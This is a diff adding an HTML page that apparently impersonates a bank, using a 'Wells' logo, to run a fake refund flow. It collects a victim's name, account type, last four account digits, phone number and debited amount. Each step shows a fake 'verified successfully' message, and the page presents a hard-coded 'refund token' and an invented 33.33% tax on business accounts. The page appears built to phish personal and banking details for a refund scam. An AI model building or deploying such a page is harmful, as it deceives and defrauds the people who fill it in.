@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>https://caseyroach-design.github.io/index.html12</title>
+  <link rel="stylesheet" href="page2.css" />
+</head>
+<body>
+
+  <main class="container">
+    <!-- Image Logo: Replace "logo.png" with your image file path or URL -->
+    <div class="logo-wrapper">
+      <img src="Wells_Logo.png" alt="Application Logo" class="app-logo" />
+    </div>
+
+    <!-- PAGE 1: Enter First And Last Name -->
+    <section id="page1" class="page active">
+      <h1 class="title">Enter First And Last Name</h1>
+
+      <form id="nameForm" class="form" novalidate>
+        <div class="input-group">
+          <input 
+            type="text" 
+            id="firstName" 
+            placeholder="First Name" 
+            autocomplete="given-name"
+          />
+          <div class="error-tooltip" id="firstNameError">
+            <div class="exclamation-box">!</div>
+            <span>Please fill out this field.</span>
+          </div>
+        </div>
+
+        <div class="input-group">
+          <input 
+            type="text" 
+            id="lastName" 
+            placeholder="Last Name" 
+            autocomplete="family-name"
+          />
+          <div class="error-tooltip" id="lastNameError">
+            <div class="exclamation-box">!</div>
+            <span>Please fill out this field.</span>
+          </div>
+        </div>
+
+        <div class="accent-bar" id="pinkBarPage1">
+          <span class="verification-text" id="verificationText">Name verified Successfully.</span>
+        </div>
+
+        <button type="submit" class="submit-btn">Submit</button>
+      </form>
+    </section>
+
+    <!-- PAGE 2: Select My Work -->
+    <section id="page2" class="page">
+      <h1 class="title">Select Account Type</h1>
+
+      <form id="workTypeForm" class="form" novalidate>
+        <div class="input-group custom-dropdown-wrapper">
+          <div class="dropdown-trigger" id="dropdownTrigger">
+            <span id="selectedWorkText">Choose Account Type</span>
+            <div class="dropdown-arrow"></div>
+          </div>
+
+          <div class="dropdown-menu" id="dropdownMenu">
+            <label class="dropdown-option">
+              <input type="radio" name="workType" value="Choose Account Type" checked />
+              <span class="radio-dot"></span>
+              <span class="option-label">Choose Account Type</span>
+            </label>
+
+            <label class="dropdown-option">
+              <input type="radio" name="workType" value="Personal Account selected successfully" />
+              <span class="radio-dot"></span>
+              <span class="option-label">Personal Account</span>
+            </label>
+
+            <label class="dropdown-option">
+              <input type="radio" name="workType" value="Business Account selected successfully" />
+              <span class="radio-dot"></span>
+              <span class="option-label">Business Account <br> ( Taxes-33.33% ) </span>
+            </label>
+          </div>
+
+          <div class="error-tooltip" id="workTypeError">
+            <div class="exclamation-box">!</div>
+            <span>Please select Account type.</span>
+          </div>
+        </div>
+
+        <div class="accent-bar" id="pinkBarPage2">
+          <span class="verification-text" id="workTypeSelectedText"></span>
+        </div>
+
+        <button type="submit" class="submit-btn">Submit</button>
+      </form>
+    </section>
+
+    <!-- PAGE 3: Enter Last 4 Digits of Work Number -->
+    <section id="page3" class="page">
+      <h1 class="title center-title">Enter Last 4 Digits of Account Number</h1>
+
+      <form id="workNumberForm" class="form" novalidate>
+        <div class="input-group">
+          <input 
+            type="text" 
+            id="workDigits" 
+            placeholder="Enter 4 digits" 
+            maxlength="4"
+            inputmode="numeric"
+            pattern="[0-9]*"
+          />
+          <div class="error-tooltip" id="workDigitsError">
+            <div class="exclamation-box">!</div>
+            <span>Please enter exactly 4 digits.</span>
+          </div>
+        </div>
+
+        <div class="accent-bar" id="pinkBarPage3">
+          <span class="verification-text" id="workDigitsVerificationText">Account number verified successfully</span>
+        </div>
+
+        <button type="submit" class="submit-btn">Submit</button>
+      </form>
+    </section>
+
+    <!-- PAGE 4: Enter Contact Number -->
+    <section id="page4" class="page">
+      <h1 class="title center-title">Enter Contact Number</h1>
+
+      <form id="contactForm" class="form" novalidate>
+        <div class="input-group">
+          <input 
+            type="tel" 
+            id="contactNumber" 
+            placeholder="Phone Number" 
+            autocomplete="tel"
+          />
+          <div class="error-tooltip" id="contactNumberError">
+            <div class="exclamation-box">!</div>
+            <span>Phone number.</span>
+          </div>
+        </div>
+
+        <div class="accent-bar" id="pinkBarPage4">
+          <span class="verification-text" id="contactVerificationText">Contact verified successfully</span>
+        </div>
+
+        <button type="submit" class="submit-btn">Submit</button>
+      </form>
+    </section>
+
+    <!-- PAGE 5: Token of MyWork -->
+    <section id="page5" class="page">
+      <h1 class="title center-title">Your Refund Token (Note Down)</h1>
+
+      <div class="form">
+        <div class="token-box" id="tokenDisplayBox">
+          <span id="tokenText">6587AWQA547TEDKj</span>
+        </div>
+
+        <button type="button" id="tokenNextBtn" class="submit-btn">Next</button>
+      </div>
+    </section>
+
+    <!-- PAGE 6: Enter work Debit Amount -->
+    <section id="page6" class="page">
+      <h1 class="title center-title">Enter Debited Amount</h1>
+
+      <form id="debitAmountForm" class="form" novalidate>
+        <div class="input-group">
+          <input 
+            type="text" 
+            id="debitAmount" 
+            placeholder="Amount in $" 
+            inputmode="decimal"
+          />
+          <div class="error-tooltip" id="debitAmountError">
+            <div class="exclamation-box">!</div>
+            <span>Please fill out this field.</span>
+          </div>
+        </div>
+
+        <div class="accent-bar" id="pinkBarPage6">
+          <span class="verification-text" id="debitAmountVerificationText">Debited amount verified successfully</span>
+        </div>
+
+        <button type="submit" class="submit-btn">Submit</button>
+      </form>
+    </section>
+  </main>
+
+  <script src="script.js"></script>
+</body>
+</html>
